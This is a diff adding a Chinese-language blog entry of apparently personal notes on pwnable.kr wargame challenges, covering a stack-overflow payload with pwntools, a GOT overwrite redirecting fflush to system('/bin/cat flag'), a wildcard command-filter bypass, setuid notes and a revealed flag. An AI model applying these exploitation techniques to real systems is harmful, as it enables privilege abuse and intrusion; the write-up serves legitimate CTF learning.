@@ -4447,4 +4447,117 @@ else
         <tag>ios</tag>
       </tags>
   </entry>
+  <entry>
+    <title>pwnable.kr (1)</title>
+    <url>/2021/03/06/pwnable.kr_1/</url>
+    <content><![CDATA[<h1 id="pwnable-kr-1"><a href="#pwnable-kr-1" class="headerlink" title="pwnable.kr (1)"></a>pwnable.kr (1)</h1><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>函数调用栈的查看<br>backtrace：查看函数调用的顺序（函数调用栈的信息）<br>frame N：切换到栈编号为N的上下文中<br>info frame：查看当前函数调用的栈帧信息</p>
+<p>“disassemble /r”命令可以用16进制形式显示程序的原始机器码<br>disass /r ‘fflush@plt’</p>
+<p>echo $PATH</p>
+<a id="more"></a>
+<h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><p>32位， <code>p32()</code> 可以让我们转换整数到<code>小端序</code>格式</p>
+<pre><code>c.sendline(b&quot;AAAA&quot;*13+p32(0xcafebabe))</code></pre>
+<p>加个<code>b</code>，不然是str格式，即<code>utf-8</code>，编码不一样<br>bytes字节符，打印以b开头</p>
+<pre><code>┌─[zentreisender@parrotos]─[~/Documents/pwnable.kr/BOF]
+└──╼ $python3 exploit.py 
+[+] Opening connection to pwnable.kr on port 9000: Done
+[*] Switching to interactive mode
+$ id
+uid=1008(bof) gid=1008(bof) groups=1008(bof)</code></pre>
+<p>id 命令</p>
+<h3 id="带参运行"><a href="#带参运行" class="headerlink" title="带参运行"></a>带参运行</h3><p>shell=ssh(‘col’,’pwnable.kr’, port=2222 ,password=’guest’)<br>p=shell.process(argv=[‘./col’,data_final]) #带参运行<br>ssh 链接也可以用process()</p>
+<h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p>当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。<br>每个<code>Unix进程（</code>除了可能的守护进程）应均有<code>三个标准的POSIX文件描述符</code>，对应于三个标准流</p>
+<p>strcmp()<br>0    the contents of both strings are equal</p>
+<pre><code>0    Standard input    STDIN_FILENO    stdin
+1    Standard output    STDOUT_FILENO    stdout
+2    Standard error    STDERR_FILENO    stderr</code></pre>
+<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>做的少了，拿着文件单步运行了半天，又是strace , ltrace ,想看出些名堂，后来偶然看到upx字符串，就想不是win才有upx压缩，最后放弃；一搜wp才发现linux底下，<code>upx -d </code>就行。</p>
+<p>断点到leave, 然后<br>peda:<br><code>x/s malloc</code>地址就得到flag</p>
+<h2 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h2><p>got 表项覆盖</p>
+<p><a href="https://medium.com/@andrew-bae/pwnable-kr-passcode-writeup-2fdfd9fec283">https://medium.com/@andrew-bae/pwnable-kr-passcode-writeup-2fdfd9fec283</a><br>栈溢出，<code>scanf(%100, name)</code></p>
+<pre><code>   0x804862f &lt;welcome+38&gt;:    lea    edx,[ebp-0x70]</code></pre>
+<p>0x70=112 至少116个字符溢出到返回地址，name总共一百，所以溢出name不行</p>
+<hr>
+<p>  [24] .data             PROGBITS        0804a024 001024 000008 00  WA  0   0  4<br>我们直接在相应位置ebp-0x10, ebp-0xc放入想要的数字，但是scanf遇空格结束输入 </p>
+<p>gdb-peda$ print $ebp-0x70<br>$1 = (void *) 0xffe43ab8</p>
+<pre><code>0x804857c &lt;login+24&gt;:    mov    edx,DWORD PTR [ebp-0x10]
+
+0x80485aa &lt;login+70&gt;:    mov    edx,DWORD PTR [ebp-0xc]
+
+0x80485c5 &lt;login+97&gt;:    cmp    DWORD PTR [ebp-0x10],0x528e6
+0x80485ce &lt;login+106&gt;:    cmp    DWORD PTR [ebp-0xc],0xcc07c9</code></pre>
+<p>0x70-xc =100 刚好溢出不到</p>
+<hr>
+<p>scanf()函数接收输入数据时，遇以下情况结束一个数据的输入：<br>① 遇空格、“回车”、“跳格”键。<br>② 遇宽度结束。<br>③ 遇非法输入。</p>
+<hr>
+<p>Partial RELRO(The GOT table can be overwritten)</p>
+<p>So, if I <code>overwrite fflush@got.plt address</code> as <code>system(“/bin/cat flag”)</code>; address, this binary will execute system(“/bin/cat flag”); after scanf .</p>
+<h3 id="小端序研究"><a href="#小端序研究" class="headerlink" title="小端序研究"></a>小端序研究</h3><pre><code>objdump -R ./passcode
+0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0
+
+plt 表项
+8048430:    ff 25 04 a0 04 08        jmp    *0x804a004
+命令中地址倒序，即小端序
+got 表中地址也是倒序，即小端序
+0x804a00c &lt;puts@got.plt&gt;:    0xf7597ca0
+0x804a00c &lt;puts@got.plt&gt;:    0xa0    0x7c    0x59 0xf7
+
+栈中地址也是小端序
+0000| 0xffb30e38 --&gt; 0xffb30e58
+gdb-peda$ x/4bx $esp
+0xffb30e38:    0x58    0x0e    0xb3    0xff
+
+只是存储方式是小端序，读出来还是原本的顺序
+payload += p32(0x0804a004)所以我们小端序写入栈中，执行地址没有小端序，why?
+
+输入12345678 = 0xBC 614E
+gdb-peda$ x/4bx $ebp-0xc
+0xffffcf4c:    0x4e    0x61    0xbc    0x00
+栈中是小端序
+输入的是单字节还是顺序存储，多字节如int，都是小端序</code></pre>
+<hr>
+<p>将fflush的got中的地址改为system的地址，这个地址不是libc库中的地址，而是代码段中的地址，即可以是任意可执行地址， 例如0x080485ea，但还要传参数，所以要提前一些：</p>
+<pre><code>   0x080485e3 &lt;+127&gt;:    mov    DWORD PTR [esp],0x80487af
+   0x080485ea &lt;+134&gt;:    call   0x8048460 &lt;system@plt&gt;
+   0x080485ef &lt;+139&gt;:    leave  
+   0x080485f0 &lt;+140&gt;:    ret    </code></pre>
+<p>0x80487af 字符串参数<br> 0x080485ea &lt;+134&gt;:    call   0x8048460 &lt;system@plt&gt;</p>
+<p>代码：<br><a href="https://github.com/Finsenty54/attack-code/blob/master/pwnable.kr/passcode.py">https://github.com/Finsenty54/attack-code/blob/master/pwnable.kr/passcode.py</a></p>
+<h2 id="rondom"><a href="#rondom" class="headerlink" title="rondom"></a>rondom</h2><p>简单，rand() 不是true rondom</p>
+<h2 id="leg"><a href="#leg" class="headerlink" title="leg"></a>leg</h2><h2 id="arm"><a href="#arm" class="headerlink" title="arm"></a>arm</h2><p><a href="https://www.cnblogs.com/ichunqiu/p/9056630.html">https://www.cnblogs.com/ichunqiu/p/9056630.html</a><br>在执行add r0, r1, #5指令时，第二条指令正在译码阶段，而第三条指令正在取指阶段。在执行第一条指令时，PC寄存器应指向第三条指令。也即，当处理器为三级流水线结构时，PC寄存器总是指向随后的第三条指令。</p>
+<p>当处理器处于ARM状态时，每条ARM指令为4个字节，所以PC寄存器的值为当前指令地址 + 8字节<br>当处理器处于Thumb状态时，每条Thumb指令为2字节，所以PC寄存器的值为当前指令地址 + 4字节 </p>
+<pre><code>/*  key1
+    0x00008cdc &lt;+8&gt;:    mov    r3, pc
+       0x00008ce0 &lt;+12&gt;:    mov    r0, r3
+           pc=0x8ce4
+    r4=pc
+    key2
+    取pc值的时候应该还在arm状态
+        pc=0x00008d0c
+    key3
+    lr 返回地址=0x00008d80
+将三个pc值加在一起 等于输入进的 k
+*/</code></pre>
+<p>服务器好像down了<br>直接给falg:<code>My daddy has a lot of ARMv5te muscle!</code></p>
+<h2 id="mistake"><a href="#mistake" class="headerlink" title="mistake"></a>mistake</h2><p>fd=open(“/home/mistake/password”,O_RDONLY,0400) &lt; 0</p>
+<p>比较运算符高于赋值运算符</p>
+<h2 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h2><p><a href="https://linux.die.net/man/7/credentials">https://linux.die.net/man/7/credentials</a><br><a href="https://en.wikipedia.org/wiki/User_identifier">https://en.wikipedia.org/wiki/User_identifier</a></p>
+<h3 id="各user-id"><a href="#各user-id" class="headerlink" title="各user id"></a>各user id</h3><p>Effective user ID and effective group ID. These IDs are used by the kernel to determine the permissions that the process will have when accessing shared resources such as message queues, shared memory, and semaphores.On most UNIX systems, these IDs also determine the permissions when accessing files.<br> obtain its effective user (group) ID using geteuid(2) (getegid(2)).</p>
+<p>Saved set-user-ID and saved set-group-ID. These IDs are used in set-user-ID and set-group-ID programs to <code>save a copy of the corresponding effective IDs </code>that were set when the program was executed (see execve(2)).<br>A set-user-ID program can assume and drop privileges by switching its effective user ID back and forth between the values in its real user ID and saved set-user-ID. This switching is done via calls to seteuid(2), setreuid(2), or setresuid(2).<br>比如ruid是普通用户，此时降权；suid是root，设置euid为suid后，提权<br> A process can obtain its saved set-user-ID (set-group-ID) using getresuid(2) (getresgid(2)).</p>
+<p>Real user ID and real group ID. These IDs determine who owns the process. A process can obtain its real user (group) ID using getuid(2) (getgid(2)).</p>
+<h3 id="setuid属性，权限，即文件有-s"><a href="#setuid属性，权限，即文件有-s" class="headerlink" title="setuid属性，权限，即文件有+s"></a>setuid属性，权限，即文件有+s</h3><p>-r-xr-sr-x  1 root shellshock_pwn   8547 Oct 12  2014 shellshock<br>When the setuid or setgid attributes are set on an executable file, then any users able to execute the file will automatically execute the file with the privileges of the file’s owner (commonly root) and/or the file’s group, depending upon the flags set</p>
+<p>chmod by setting the high-order octal digit to 4 for setuid or 2 for setgid. “chmod 6711 file” will set both the setuid and setgid bits (4+2=6), making the file read/write/executable for the owner (7), and executable by the group (first 1) and others (second 1). When a user other than the owner executes the file, the process will run with user and group permissions set upon it by its owner. For example, if the file is owned by user root and group wheel, it will run as root:wheel no matter who executes the file.</p>
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>4701 on an executable file owned by ‘root’ and the group ‘root’</p>
+<p>A user named ‘thompson’ attempts to execute the file. The executable permission for all users is set (the ‘1’) so ‘thompson’ can execute the file. The file owner is ‘root’ and the SUID permission is set (the ‘4’) - so the file is executed as ‘root’.</p>
+<h3 id="本题权限"><a href="#本题权限" class="headerlink" title="本题权限"></a>本题权限</h3><p>shellshock@pwnable:~$ stat -c “%a %A” shellshock<br>2555 -r-xr-sr-x<br> setgid bits</p>
+<p>破壳（ShellShock）漏洞<br><a href="https://www.freebuf.com/articles/system/45390.html">https://www.freebuf.com/articles/system/45390.html</a></p>
+<h2 id="coin1"><a href="#coin1" class="headerlink" title="coin1"></a>coin1</h2><p>服务器上没有按pwntools，运行不起来，改成re+socket中不行，懒得弄了</p>
+<h2 id="cmd1"><a href="#cmd1" class="headerlink" title="cmd1"></a>cmd1</h2><p>echo $PATH<br>PATH表明程序所在的目录，运行一个程序，不在当前文件夹中，会遍历PATH中的目录，寻找程序所在文件夹<br>cat 命令在<code>/bin</code> 下<br>该题，用到了linux通配符<br><code>./cmd1 &quot;/bin/cat fla*&quot;</code></p>
+]]></content>
+      <categories>
+        <category>pwnable.kr</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
 </search>
